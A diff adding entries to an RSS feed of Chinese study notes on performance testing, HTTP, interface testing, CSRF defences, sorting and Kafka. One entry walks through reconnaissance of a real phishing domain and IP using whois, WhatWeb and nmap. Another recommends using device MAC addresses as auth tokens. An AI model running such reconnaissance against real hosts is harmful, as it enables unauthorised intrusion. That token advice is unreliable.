+3.TPS(Transaction Per second) 每秒钟系统能够处理事务的数量，它是衡量系统处理能力的重要指标。此外，一个系统的性能其实是由TPS决定，跟并发用户数没有多大关系。一般在同样的TPS下，可以用不同并发用户数去压测得到，只是得到响应时间不同。
+4.QPS(Query Per Second) 每秒查询数。QPS 基本类似于 TPS，但是不同的是，对于一个页面的一次访问，形成一个TPS；但一次页面请求，可能产生多次对服务器的请求，服务器对这些请求，会被计入QPS之中。
+ 例如：访问一个页面会请求服务器3次，产生一个“T”，产生3个“Q”。 PS： QPS(TPS) = 并发数 / 平均响应时间  5.HPS(Hit Per Second ) / RPS(Request Per Second) 点击率 / 每秒HTTP请求数。
+6.响应时间(RT) 网页响应请求的时间，测试时可参考2/5/8原则，即2秒之内用户觉得很快，5秒之内用户觉得还可以，8秒之外用户觉得系统慢，无法忍受。
+7.吞吐量 吞吐量指在一次性能测试过程中网络上传输的数据量的总和。对于交互式应用来说，吞吐量指标反映的是服务器承受的压力，在容量规划的测试中，吞吐量是一个重点关注的指标，因为它能够说明系统级别的负载能力，另外，在性能调优过程中，吞吐量指标也有重要的价值。吞吐量是整个系统的瓶颈。
+但是，用吞吐量来衡量一个系统的输出能力是极其不准确的，我们要加单位时间的限制，这就引出了一个新的概念——吞吐率（单位时间内网络上传输的数据量，也可以指单位时间内处理客户请求数量，通常情况下，吞吐率用“字节数/秒”来衡量）
+a.吞吐量指标的作用  用于协助设计性能测试场景，以及衡量性能测试场景是否达到了预期的设计目标。 用于协助分析性能瓶颈：吞吐量的限制是性能瓶颈的一种重要表现形式，因此，有针对性地对吞吐量设计测试，可以协助尽快定位到性能瓶颈的所在位置。 一般情况下 TPS 与 吞吐量说的是同一个东西  b.快速识别系统性能瓶颈的方法——RBI（rapid bottleneck identify）  80%的系统，其性能瓶颈都由吞吐量制约 并发用户数和吞吐量瓶颈之间存在一定的关联 采用吞吐量测试可以更快速定位问题 通过不断增加并发用户数和吞吐量观察系统的性能瓶颈。然后，从网络、数据库、应用服务器和代码本身4个环节确定系统的的性能瓶颈。  c.容量预测 对于我们设计的系统，我们在上线前肯定需要测试下能接收用户多大的访问量。即希望评估出最大的日PV到来的时候，我们的系统是否能支撑。但怎么去评估呢，难道要造一个最大日PV的情景来测试？其实根据已有的经验和数据，可以总结出了高峰QPS和日PV的关系。通过数学建模，我们发现高峰每台服务器【QPS = (( 总PV X 80% ) / ( 24 X 60 X 60 X 40%)) / 服务器数量】。其中80%和40%这2个数字是个不固定的参数，这个公式代表的意思是，在40%的时间（12小时）内产生80%总PV的QPS均值。对于不同的情景有不同的参数。</description>
+    </item>
+    
+    <item>
+      <title>随记(10)——并发和并行</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B010%E5%B9%B6%E5%8F%91%E5%92%8C%E5%B9%B6%E8%A1%8C/</link>
+      <pubDate>Sat, 19 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B010%E5%B9%B6%E5%8F%91%E5%92%8C%E5%B9%B6%E8%A1%8C/</guid>
+      <description>1.什么是并发 并发（Concurrent），在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理机上运行。并发是会抢占资源的。
+2.什么是并行 并行（Parallel），当系统有一个以上CPU时，可以让一个CPU执行一个进程，另一个CPU执行另一个进程，两个进程互不抢占CPU资源，可以同时进行，这种方式称之为并行，决定并行的因素不是CPU的数量，而是CPU的核心数量，比如一个CPU多个核也可以并行。并行是不会抢占资源的。
+3.并行和并发的区别  并发，指的是多个事情，在同一时间段内同时发生了 并行，指的是多个事情，在同一时间点上同时发生了 并发的多个任务之间是互相抢占资源的 并行的多个任务之间是不互相抢占资源的 并发是一个处理器多条等待队列 并行是多个处理器多条等待队列  4.并发的两种情况  一种是严格意义上的并发，即所有的用户在同一时间点做同一件事或操作，这种操作一般指做同一类型的业务。比如，所有用户同一时刻做并发登陆，同一时刻做表单提交。 另外一种并发是广义范围的并发，这种并发与前一种并发的区别是，尽管多个用户对系统发出了请求或者进行了操作，但是这些请求或都操作可以是相同的，也可以是不同的。比如，在同一时刻有用户在登录，有用户在提交表单  5.并发编程的性能消耗？  在使用多线程时，线程的上下文切换会消耗性能，消耗时间 其次是资源限制问题。由于程序的执行速度受限于计算机硬件资源或软件资源。例如，服务器的带宽只有 2Mb/s，某个资源的下载速度是 1Mb/s 每秒，即使系统启动 10 个线程下载资源，下载速度不会变成 10Mb/s，所以在进行并发编程时，要考虑这些资源的限制。硬件资源限制有带宽的上传/下载速度、硬盘读写速度和CPU的处理速度。软件资源限制有数据库的连接数和socket连接数等。 对于硬件资源限制，可以考虑使用集群并行执行程序。既然单机的资源有限制，那么就让程序在多机上运行，搭建服务器集群，使用不同的机器处理不同的数据。 对于软件资源限制，可以考虑使用资源池将资源复用。比如使用连接池将数据库和Socket连接复用，或者在调用对方 webservice 接口获取数据时，只建立一个连接。  6.并发编程的优势 在实现网络资源的断点续传时，通过将资源进行切分为不同大小的任务，启动多线程下载。这样即使在网络阻塞时，下载速度的减速效果也没这么明显。这便是多线程的优势，即使一个线程由于网络阻塞被卡住，但可能会有另一个线程正处在慢启动的最终加速阶段，这样总体的下载速度就明显优于单线程。</description>
+    </item>
+    
+    <item>
+      <title>随记(9)——响应时间的组成</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B09%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E7%9A%84%E7%BB%84%E6%88%90/</link>
+      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B09%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E7%9A%84%E7%BB%84%E6%88%90/</guid>
+      <description>响应时间RT把整个过程分三个部分：呈现时间，数据传输时间和系统处理时间。
+1.呈现时间 主要说的是浏览器对接收到数据的一个处理展示的过程。我们会发现同一台电脑同一个网站，通过Chrome去访问，页面的呈现速度会比IE略快，呈现时间不仅与浏览器有关，还和承载它的操作系统有关，以及电脑硬件（比如CPU、 内存）
+2.数据传输时间 我们发送一个请求需要时间，系统处理完后返回给我们也需要时间。
+互联网是个网，就是有着相同的起点与终点，信息也有可能走的不同的路线。即使你发出的请求都能成功发出，但到目的地的时候，已经不能叫并发了。这也是为什么我们在一般做性能测试时，一般要强调要在局域网中进行。当然，有些性能测试需要在互联网中时行。但它们重点不是验证服务器端的最大处理能力。
+3.系统处理时间 当系统得到请求后会对请求进行处理并将结果返回。我们进行性能测试的目的主要就是验证系统的处理时间
+4.测试方法 因为前面的呈现时间和数据传输时间都是我们不可控制的，用户使用的电脑及浏览器千差万别，用户的网络状况千差万别。我们唯一能控制的就是将系统的处理请求的时间缩到最短。
+一般测试工具都应该屏蔽响应的呈现过程，只是模拟多用户并发请求，计算用户得到响应的时间，不会将服务器的每个响应做客户端渲染呈现。
+对于数据传输的问题，这也是我要强调的性能测试要在局域网中进行，在局域网中一般不会受到数据带宽的限制。所以，可以对数据的传输时间忽略不计。</description>
+    </item>
+    
+    <item>
+      <title>随记(8)——Web请求</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B08web-%E8%AF%B7%E6%B1%82/</link>
+      <pubDate>Thu, 17 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B08web-%E8%AF%B7%E6%B1%82/</guid>
+      <description>1.POST和GET的区别  发送时都包含请求头请求参数，POST多了请求body GET多用来查询，请求参数放在URL中，不会对服务器上的内容产生作用。POST用来提交，数据放入body中 GET是直接添加到URL后面的，直接就可以在URL中看到内容，而POST是放在报文内部的，用户无法直接看到 GET提交的数据长度是有限制的，因为URL长度有限制，具体的长度限制视浏览器而定。而POST没有  2.响应状态码 访问一个网页时，浏览器会向web服务器发出请求。此网页所在的服务器会返回一个包含HTTP状态码的信息头用以响应浏览器的请求。常见的状态码分类
+ 1XX- 信息型，服务器收到请求，需要请求者继续操作。 2XX- 成功型，请求成功收到，理解并处理。 3XX - 重定向，需要进一步的操作以完成请求。 4XX - 客户端错误，请求包含语法错误或无法完成请求。 5XX - 服务器错误，服务器在处理请求的过程中发生了错误。  3.常见状态码  200 - 客户端请求成功 301 - 资源（网页等）被永久转移到其它URL 302 - 临时跳转 400 - 客户端请求有语法错误，不能被服务器所理解 401 - 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 404 - 请求资源不存在，可能是输入了错误的URL 500 - 服务器内部发生了不可预期的错误 503 - 服务器当前不能处理客户端的请求，一段时间后可能恢复正常  4.什么是Token Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。推荐用设备号/设备mac地址作为Token或者使用session值作为Token
+5.Cookie与Session 首先我们需要知道HTTP协议的一个重要特点——“无状态”，数据交换完成，服务端和客户端就断开连接了，所以请求之间没有相关联系，每一个请求都是一个独立的新请求，为了实现状态保留的，保证前后正常通信，需要在客户端或服务器端存储与会话相关的数据,所以设计了这两个机制——Cookie与Session
+Cookie是由W3C组织提出的保存在客户端本地，方便下次访问服务端时直接放到请求报文头中，如登录的cookie，下次访问同一网站时，用户不必再次输入用户名和密码就已经直接登录.
+Session是保存在服务器上用来记录用户状态的机制。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。Session在用户第一次访问服务器的时候自动创建。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。一般客户端和服务端通过一个SessionID来进行沟通，为了防止不同的用户之间出现冲突和重复，SessionID一般是一个32或者48个字节的随机字符串
+6.Cookie与Session的区别  存放位置不同：cookie数据存放在客户端（浏览器）；session数据放在服务器端，一般存储在内存中，但是SessionID存储在客户端cookie中。 cookie由浏览器存储在本地，安全有风险，不宜存储敏感信息，如密码等。 session会在一定时间内保存在服务器上，访问较多时，影响服务器性能。  </description>
+    </item>
+    
+    <item>
+      <title>随记(7)——为什么要做接口测试</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B07%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%81%9A%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/</link>
+      <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B07%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%81%9A%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/</guid>
+      <description>1.怎么理解接口 举个例子，假如我们在开发1个bug管理系统，该系统需要拿到公司的所有开发和测试人员的信息，这样开发和测试人员不用注册都可以登录进去了，这应该很好理解。
+那么这些人员的信息储存在哪里呢？一般存储在hr系统里。现在的需求更加明确了，我们要到hr系统中去拿到人员信息，获取hr系统中的人员资源。
+直接把hr系统的数据库拷贝一份放到bug管理系统里，不过这样不好，因为数据的同步会有点麻烦；还可以直接连hr系统的数据库去查，这样也不太好，这样我们就需要了解hr系统的数据存储结构和逻辑，一旦hr系统的数据字段发生改变，bug管理系统也要去改，以便同步。
+比较好的做法是，hr系统暴露一些接口，通过这些接口去获取人员信息资源，这样bug系统就不需要关心hr系统的数据存储实现。
+这些接口可能是这样的：
+ 登录的接口，提供人员的用户名和密码，去hr系统中判断该人员是否存在，如果存在，验证用户名和密码，如果验证通过就返回1个token，该token就是这个人员的通行证，通过token可以登录到bug管理系统中去； 获取人员信息的接口，返回该人员的职位：测试还是开发，以及用户名，昵称等信息；  综上：接口是不同系统或模块之间资源交流的工具
+2.接口测试实际上是黑盒测试 作为黑盒测试，基本的测试思路是通过输入和输出判断被测系统或者对象的逻辑。
+获取人员的信息，我需要把人员的用户名传给hr系统接口，这样hr系统的接口会返回给我用户的一些更加具体的信息。这里的输入是用户名，输出是用户的详细信息。
+3.为什么要做接口测试 大部分系统和产品中，资源一般都是产品的核心，比如微信核心资源就是通讯录关系链和聊天记录等，因此资源是必测的。接口是不同系统或模块之间操作资源方式，所以接口测试是必要的
+另外接口中大部分的内容是数据，通过数据的对比我们能推测到系统和产品的逻辑，测接口就是测逻辑。
+最后接口中的返回相对单纯，不像web页面，html代码中有太多UI的东西，UI最不稳定，变化太快，接口相对稳定一点点，但是里面的干扰信息更少，断言相对容易很多。
+接口测试用例怎么写，建议遵循3A原则。
+ Arrange: 测试用例执行之前需要准备测试数据，包括需要输入的数据及存量数据 Act: 通过不同的参数来调用接口，并拿到返回 Assert: 必须做断言，否则用例就没有任何意义了  4.什么是Mock Server 前端和后端往往节奏是不一致的。前端很多情况下需要等待后台的API开发完成后才能进行开发联调和测试，这种前后端不对称就造成了前后端团队节奏不一致，从而造成整个项目/产品交付/发布延期。
+有一种解决方案的思路是前后端先约定好后端提供的API接口的细节，前端人员自行先模拟出这些后端的实现，当然这些实现是假的，不过前端可以去调用这些假的实现，而且能拿到返回，这样一来前端就不需要等待后端开发完成才开始工作了。
+但是这样还是会有问题，前端实现的假的API没办法迅速反映出后端的变化。简单来说就是后端可能在约定好的API接口上进行了些许修改，而没有知会前端人员，这样前端的假的API实现并没有相应更新，在正式联调时就会出现问题。
+像这种假的API实现，不管是前端实现的还是后端去实现的，我们可以称之为mock server
+ mock表示这个API返回的数据是假的，仅作为测试用的 server表示需要启动服务，说到底这是一个服务程序  5.契约测试 由于前后端往往有一些信息不对称，导致约定的API可能在前后端都会发生变化，所以保证前后端的一致性就成了一个挑战。这时候就有人提出了契约测试，大致思想是前后端共用一份契约，约定了API的细节，前后端的任何变化都需要先修改契约，然后通过契约去通知前后端团队，统一更新实现。这也是契约精神的表现。</description>
+    </item>
+    
+    <item>
+      <title>随记(6)——渗透的思路</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B06%E6%B8%97%E9%80%8F%E7%9A%84%E6%80%9D%E8%B7%AF/</link>
+      <pubDate>Tue, 15 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B06%E6%B8%97%E9%80%8F%E7%9A%84%E6%80%9D%E8%B7%AF/</guid>
+      <description>原文参考：@Tsing 
+ 使用到的工具 nmap WhatWeb w3af sqlmap
+一次渗透的过程 首先这里有一个伪造的LOL站点 uvu.cc/ixMJ ，这是一个经过缩短链接处理的网站，打开后跳转到真实网址 mfspfgp.top ，其页面如图：
+在点击登录后，弹出一个对话框，让输入QQ号和密码，实现盗号操作
+打开浏览器的开发者工具，查看网站的 POST 过程。找到其 POST 的地址 mfspfgp.top/lollove.php ，参数只有两个：name 和 pass
+下面来看看能不能挖掘些其他的东西，首先PING一下域名 mfspfgp.top ，得到服务器的 IP 地址（103.98.114.75）
+然后查一下IP，发现是个香港的服务器
+之后查一下IP的 whois 信息，得到一个 QQ 邮箱和一个手机号，当然这两个联系方式也不一定是真的。
+然后，利用邮箱反查工具，查一下这个邮箱还注册了哪些网站，结果找出 9 个，发现其中有 6 个可以正常访问。
+对应三种形式的诈骗网页，分别是刚才展示的【生日祝福】、【酷秀一夏】、【2017赛事正式开始】，后两个页面截图分别如下
+最后，将上面提到的网址全部 Ping 了一下，获取了全部的 IP 地址
+我们选择其中物理位置最详细的那个 IP 来尝试渗透
+首先在 WhatWeb 里面检索一下这个 IP 地址，即可知道这个网站采用的是nginx 1.8.1服务器，使用的是5.5.38版本的 PHP
+然后用 nmap 扫了一下端口和运行的服务，发现开放的端口还是蛮多的
+PORT STATE SERVICE1/tcp open tcpmux3/tcp open compressnet4/tcp open unknown6/tcp open unknown7/tcp open echo9/tcp open discard.</description>
+    </item>
+    
+    <item>
+      <title>随记(5)——什么是接口</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B05%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A5%E5%8F%A3/</link>
+      <pubDate>Mon, 14 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B05%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A5%E5%8F%A3/</guid>
+      <description>参考原文：接口测试总结 @猴子请来的救兵 
+ 1.什么是接口 我们先来看一张图，从这张图来了解什么是接口。
+如图中 A 线，A 线指向一个电灯的开关，这个电灯的开关就可以称为接口。它有两个状态——开和关，我们可以通过选择不同的参数来实现电灯的开关。
+实际我们知道电灯的开关其实是通过零线、火线来操控的，而接口呢，其实就是把这些复杂的操作简化了，让你看到的只有一个开关。而我们做接口测试也只需要测试这个开关就可以完成任务。
+ 当你访问 http://127.0.0.1:8080/light?opt=open ，让零线、火线连通，此时灯亮。 当你访问 http://127.0.0.1:8080/light?opt=close ，让零线、火线断开，此时灯灭。  2.接口的结构 一个URL就是一个接口，接下来需要理解一下HTTP的URL是怎么组成为一个接口的，如图：
+ 请求协议：如 http — 普通的http请求，https — 加密的http请求，ftp — 文件传输协议 请求IP：提供接口的系统所部署的服务器地址 请求端口：如果不填端口，默认是80，否则需要填写端口号 接口路径：指系统提供的接口在什么位置 接口参数：参数在接口路径后，用“?”来表示路径地址完了，剩下的都是参数了，用“&amp;amp;”来区分参数个数 参数值： 接口参数的值  3.接口的HTTP参数【隐藏参数】 http请求方式  GET --- 通过请求URI得到资源POST --- 用于添加新的内容PUT --- 用于修改某个内容DELETE --- 删除某个内容CONNECT --- 用于代理进行传输，如使用SSLOPTIONS --- 询问可以执行哪些方法PATCH --- 部分文档更改PROPFIND (wedav) --- 查看属性PROPPATCH (wedav) --- 设置属性MKCOL (wedav) --- 创建集合（文件夹）COPY (wedav) --- 拷贝MOVE (wedav) --- 移动LOCK (wedav) --- 加锁UNLOCK (wedav) --- 解锁TRACE --- 用于远程诊断服务器HEAD --- 类似于GET, 但是不返回body信息，用于检查对象是否存在，以及得到对象的元数据http请求头 请求头包含许多有关的客户端环境和请求正文的有用信息。例如，请求头可以声明浏览器所用的语言，请求正文的长度</description>
+    </item>
+    
+    <item>
+      <title>随记(4)——如何提高吞吐量</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B04%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E5%90%9E%E5%90%90%E9%87%8F/</link>
+      <pubDate>Sun, 13 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B04%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E5%90%9E%E5%90%90%E9%87%8F/</guid>
+      <description>1.服务器（进程）级别 服务器级别增加网站吞吐量是诸多措施中最容易并且是效果最好的，如果一个网站能通过增加少量的服务器来提高吞吐量，应该优先采用。毕竟一台服务器的费用相比较一个程序员费用来说要低的多。但是有一个前提，就是你的服务器是系统的瓶颈，网站系统之后的其他系统并非瓶颈。如果你的系统的瓶颈在接口或者其他服务，盲目的增加服务器并不能解决你的问题。
+通过增加服务器来解决你的网站瓶颈，意味着你的网站需要做负载均衡。负载均衡(Load Balance)，其含义就是指将负载（工作任务）进行平衡、分摊到多个操作单元上进行运行，例如FTP服务器、Web服务器、企业核心应用服务器和其它主要任务服务器等，从而协同完成工作任务。负载均衡的方案，比如 LVS、Nginx、F5 等
+2.线程级别 当一个请求到达服务器并且正确的被服务器接收之后，最终执行这个请求的载体是一个线程。当一个线程被CPU载入执行其指令的时候，在同步的状态下，当前线程会阻塞在那里等待CPU结果，如果CPU执行的是比较慢的IO操作，线程会一直被阻塞闲置很长时间，这里的很长是对比CPU的速度而言。当一个新的请求到来的时候，如果没有新的线程去领取这个任务并执行，要么会发生异常，要么创建新的线程。
+线程是一种很稀缺的资源，不可能无限制的创建。这种情况下我们就要把线程这种资源充分利用起来，不要让线程停下来。这也是程序推荐采用异步的原因。试想，一个线程不停的在工作，遇到比较慢的IO不会去等待结果，而是接着处理下一个请求，当IO的结果返回来得到通知的时候，线程再去取IO结果，岂不是能在相同时间内处理更多的请求。程序异步化（非阻塞）会明显提高系统的吞吐量，但是响应时间可能会稍微变大。
+还有一点，尽量减少线程上下文在CPU的切换，因为线程上线文切换的成本也是比较大的，在线程切换的时候，CPU需要把当前线程的上下文信息记录下来用以下次调用的时候使用，然后把新线程的上下文信息载入然后执行。这个过程相对于CPU的执行速度而言，要慢很多。
+3.CPU级别 现代操作系统都采用虚拟寻址的方式，它的寻址空间（虚拟存储空间）为4G（2的32次方）。操作系统将虚拟空间分为两类：内核空间和用户空间。
+ 内核空间独立于用户空间，有访问受保护的内存空间、IO设备的权限（所有的用户空间共享）。 用户空间就是我们的应用程序运行的空间，其实用户空间并没有操作各种IO设备的权限，像我们平时读取一个文件，本质上是委托内核空间去执行读取指令的，内核空间读取到数据之后再把数据复制到程序运行的空间，最后应用程序再把数据返回调用方。  内核会为每个I/O设备维护一个 buffer（同一个文件描述符读和写的buffer不同），应用程序发出一个IO操作的指令其实通过了内核空间和用户空间两个部分，并且发生了数据的复制操作。这个过程其实主要包含两个步骤：用户进程发出操作指令并等待数据；内核把数据返回给用户进程（buffer的复制操作）。根据这两个操作的不同表现，所以IO模型有了同步阻塞，同步非阻塞，异步阻塞，异步非阻塞的概念。利用CPU提高系统吞吐量主要目标是提高单位时间内CPU运行的指令数，避免CPU做一些无用功。可以通过增加CPU的个数来增加吞吐量
+CPU负责把buffer的数据copy到应用程序空间，应用程序再把数据返回给调用方，假如这个过程发生的是一次Socket操作，应用程序在得到 IO 返回数据之后，还需要网卡把数据返回给client端，这个过程又需要把刚刚得到的buffer数据再次通过内核发送至网卡，通过网络传送出去。由此可见CPU把buffer数据copy到应用程序空间这个过程完全没有必要，在内核空间完全可以把buffer数据直接传输至网卡，这也是零拷贝技术要解决的问题。
+PS：零复制 (Zero-copy) 技术是指计算机执行操作时，CPU不需要先将数据从某处内存复制到另一个特定区域。这种技术通常用于通过网络传输文件时节省CPU周期和内存带宽。
+4.网络传输级别 由于协议大部分是TCP/IP，所以在协议传输方面优化的手段比较少，但是应用程序级别协议可以选择压缩率更好的，比如采用GRPC会比单纯的HTTP协议要好很多，HTTP2 要比HTTP 1要好很多。
+另外一方面网卡尽量加大传输速率，比如千兆网卡要比百兆网卡速度更快。由于网络传输比较偏底层，所以人工干预的切入点会少很多。
+5.代码层  加大应用的进程数，增加并发数，特别在进程数是瓶颈的情况下； 优化线程调用，尽量线程池化； 应用的代码异步化，特别是异步非阻塞式编程对于提高吞吐量效果特别明显； 充分利用多核CPU优势，实现并行编程； 减少每个调用的响应时间，缩短调用链，例如通过加索引的方式来减少访问一次数据库的时间；  </description>
+    </item>
+    
+    <item>
+      <title>随记(3)——排序算法</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B03%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</link>
+      <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B03%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</guid>
+      <description>参考原文：常见排序算法 @zwtgyh 
+ 1.冒泡排序 原理解析 选择第 1 个和第 2 个数字，如果第 1 个大于第 2 个，则二者交换位置（假设是升序排列）。之后选择第 2个和第 3 个数字，类似交换处理。一轮下来后，最大的数字会冒泡到最后一位。接下来，忽略已经排好的数字，对于剩下的数字再来一轮，直到所有的数字都排列完成。
+复杂度分析 若文件的初始状态是正序的，一趟扫描即可完成排序。所需的关键字比较次数 C 和记录移动次数 M 均达到最小值：Cmin = n-1，Mmin = 0，所以，冒泡排序最优的时间复杂度为 O(n)
+若初始文件是反序的，需要进行 n-1趟排序。每趟排序要进行 n-1 次关键字的比较( 1 ≤ i ≤ n-1 )，且每次比较都必须移动记录三次来达到交换记录位置。在这种情况下，比较和移动次数均达到最大值：Cmax=n(n-1)/2，Mmax=3n(n-1)/2，冒泡排序的最坏时间复杂度为O(n^2)
+ 平均的时间复杂度为：O(n^2) 最优的空间复杂度，不需要借用第三方内存空间，则复杂度为0 最差的空间复杂度，每次都要借用一次内存，按照实际的循环次数，为O(N) 平均的空间负杂度为：O(1)  2.插入排序 原理解析  从第一个元素开始，该元素可以认为已经被排序 取出下一个元素，在已经排序的元素序列中从后向前扫描 把取出的元素放到已排序的元素中间的合适位置 重复步骤2~3 就像排队一样，依次每次挑一个同学，把该同学插入到已经排好的部分队伍里。  复杂度分析  最优的情况，当待排序数组是有序时，只需当前数跟前一个数比较一下就可以了，这时一共需要比较N-1次，时间复杂度为 O(N) 。 最坏的情况，当待排序数组是逆序的，此时需要比较次数最多，总次数记为：1+2+3+…+N-1，所以，插入排序最坏情况下的时间复杂度为O(N^2) 。 平均来说，A[1..j-1] 中的一半元素小于 A[j]，一半元素大于 A[j]。插入排序在平均情况运行时间与最坏情况运行时间一样，是输入规模的二次函数。 插入排序的空间复杂度为常数阶O(1)  3.快速排序 原理解析 快速排序使用分治法策略来把一个序列分为两个子序列。其步骤为：</description>
+    </item>
+    
+    <item>
+      <title>随记(2)——什么是CSRF</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B02%E4%BB%80%E4%B9%88%E6%98%AF-csrf/</link>
+      <pubDate>Fri, 11 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B02%E4%BB%80%E4%B9%88%E6%98%AF-csrf/</guid>
+      <description> 参考原文：CSRF 是什么？@饥人谷若愚 
+ 1.什么是 CSRF 跨站请求伪造 CSRF (Cross Site Request Forgery)攻击，中文名：跨站请求伪造。其原理是攻击者构造网站后台某个功能接口的请求地址，诱导用户去点击或者用特殊方法让该请求地址自动加载。这样，当用户在登录状态下请求这个地址时，服务端就会以为这个非法操作是用户合法的操作。
+2.如何避免 在客户端防范方面：对于数据库的修改请求，全部使用 POST 提交，禁止使用 GET 请求。在服务器端防范方面：一般的做法是在表单里面添加一段隐藏的唯一的 token (请求令牌)。比如：
+ 服务端在收到路由请求时，生成一个随机数，在渲染请求页面时把随机数埋入页面（一般埋入 form 表单内） 服务端设置 setCookie，把该随机数作为 cookie 或者 session 种入用户浏览器 当用户发送 GET 或者 POST 请求时带上 csrf_token 参数（对于 Form 表单直接提交即可，因为会自动把当前表单内所有的 input 提交给后台，包括 csrf_token） 后台在接受到请求后解析请求的 cookie 获取 csrf_token 的值，然后和用户请求提交的 csrf_token 做个比较，如果相等表示请求是合法的 尽量少用 GET。假如攻击者在我们的网站上传了一张图片，用户在加载图片的时候实际上是向攻击者的服务器发送了请求，这个请求会带有 referer 表示当前图片所在的页面的 url。 而如果使用 GET 方式接口的话这个 URL 就形如：https://xxxx.com/gift?giftId=aabbcc&amp;amp;_csrf_token=xxxxx，把 token 接在 URL 后面，那相当于攻击者获取了 csrf_token ，短时间内可以使用这个 token 来操作其他 GET 接口。  </description>
+    </item>
+    
+    <item>
+      <title>随记(1)——什么是 Kafka</title>
+      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B01%E4%BB%80%E4%B9%88%E6%98%AF-kafka/</link>
+      <pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B01%E4%BB%80%E4%B9%88%E6%98%AF-kafka/</guid>
+      <description>参考原文：Kafka 初识 @暮良文王 
+ 1.什么是 KafKa Kafka（Apache Kafka）是一款开源的消息引擎系统 （Messaging System），根据维基百科的定义：消息引擎系统是一组规范，企业利用这组规范在不同系统之间传递语义准确的消息，实现松耦合的异步式数据传递。简单来说消息引擎的作用就是实现以下的功能
+ 系统 A 发送消息给消息引擎系统 系统 B 从消息引擎系统中读取 A 发送的消息。  2.Kafka 如何设计信息 Kafka 使用的是纯二进制的字节序列。如果我们在设计消息使用了 CSV、XML 亦或是 JSON 这些结构化的框架，那么在发送给 Kafka 前都要将其转换成二进制的字节序列。
+3.Kafka 如何传递消息 Kafka 同时支持两种消息引擎模型，即：
+ 点对点模型：也叫消息队列模型。即系统 A 发送的消息只能被系统 B 接收，其他任何系统都不能读取 A 发送的消息。日常生活的例子比如电话客服就属于这种模型：同一个客户呼入电话只能被一位客服人员处理，第二个客服人员不能为该客户服务。 发布 / 订阅模型：与上面不同的是，它有一个主题（Topic）的概念，你可以理解成逻辑语义相近的消息容器。该模型也有发送方和接收方，只不过提法不同。发送方也称为发布者（Publisher），接收方称为订阅者（Subscriber）。和点对点模型不同的是，这个模型可能存在多个发布者向相同的主题发送消息，而订阅者也可能存在多个，它们都能接收到相同主题的消息。生活中的报纸订阅就是一种典型的发布 / 订阅模型。　  4.为什们要使用 Kafka 为什么系统 A 不能直接发送消息给系统 B，中间还要隔一个消息引擎呢？为什么要使用 Kafka 呢？
